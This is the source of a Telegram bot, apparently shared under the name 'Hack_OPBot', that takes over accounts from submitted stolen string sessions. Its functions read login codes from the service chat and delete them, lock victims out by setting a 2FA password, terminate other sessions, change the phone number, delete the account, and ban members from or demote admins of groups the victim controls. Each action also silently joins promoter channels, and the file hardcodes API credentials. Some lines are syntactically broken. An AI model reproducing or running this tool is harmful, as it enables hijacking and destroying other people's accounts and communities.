#All credit goes to LEGEND-OS
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types, Button

api_id = os.environ.get("APP_ID")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('LegendBoy', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

legendboy = 2024465080

Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await bot(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await bot(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await bot(leave("@Legend_Userbot")
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await bot(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await bot(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await bot(leave("@Legend_Userbot")
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_K_Userbot")
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    try:
      await X.edit_2fa('LEGENDBOY IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
        try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_participants(grp)
        try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Legend_K_UserBot")
    except BaseException:
      pass
    try:
      await X(join("@Official_K_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Official_LegendBot")
    except BaseException:
      pass
    try:
      await X(leave("@Legend_Userbot")
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "Official_K_LegendBot"
menu = '''

"A" :~ [التحقق من المجموعات والقنوات الـتي يملكـها]

"B" :~ [افحـص المعلومات مثـل الرقم والمـعرف والخ... ]

"C" :~ [قم بإزاله اعضـاء مـن جـروب]

"D" :~ [اذا سجلت دخـول بالرقم تسطيع مـعرفه الـكود]

"E" :~ [انضـم الي قناه او جـروب]

"F" :~ [مـغادره كـل الـقنوات والجـروبات]

"G" :~ [الخـروج من جـروب او قـناه]

"H" :~ [ مـعرفه اذا كان الحساب به تحتقق بـخطوتين ام لا]

"I" :~ [حـذف جيمع الجلسات معاد جلسه التيرمكس]

"J" :~ [ حـذف الحسـاب من الـتليجرام]

"K" :~ [مسح جميع من الادمنيه]

"L" ~ [رفع شخص ادمن]

"M" ~ [تغير رقم الهاتف]

I will add more features Later 😅
'''
mm = '''
**⚜NOTICE FIRST JOIN LORD GROUP @M2RR1⚜**
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J")
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M")
    ],
  [
    Button.url("المالك", "https://t.me/M_R_C2")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    legendboy = [
      [
        Button.url("Click Here", f"https://t.me/{Bot_Username}?start=hack")
        ]
      ]         
    await event.reply("Click Below To Use Me", buttons=legendboy)
  else:
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/OOOJ30")
        ]
      ]
    await event.reply("عليك الاشتراك في القناهl!\n ثم اضغط هنا ~ /hack", buttons=legendbye)
    
       
@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  legendboy = [
    [
      Button.url("Click Here", f"https://t.me/{Bot_Username}")
      ]
    ]         
  await event.reply("Click Below To Use Me", buttons=legendboy)
  
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M")
        ],
      [
        Button.url("المالك", "https://t.me/M_R_C2")
        ]
    ]
    await x.send_message(f"اختر ماذا ستفعل بلجلسه \n\n{menu}", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @LegendBoy_XD")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("GIVE STRING SESSION")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("GIVE STRING SESSION")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("String Session Has Been Terminated", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("GIVE STRING SESSION")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("GIVE STRING SESSION")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.", buttons=keyboard)
      else:
        await event.reply("Sorry User Have two step already", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("The all sessions are terminated\n\nThanks For using LegendBoyBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      grp = await x.get_response()
      await x.send_message("NOW GIVE USER USERNAME")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
        else:
          await event.respond("Something is wrong")
      except Exception as e:
        await event.respond("SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e))
     


client.run_until_disconnected()
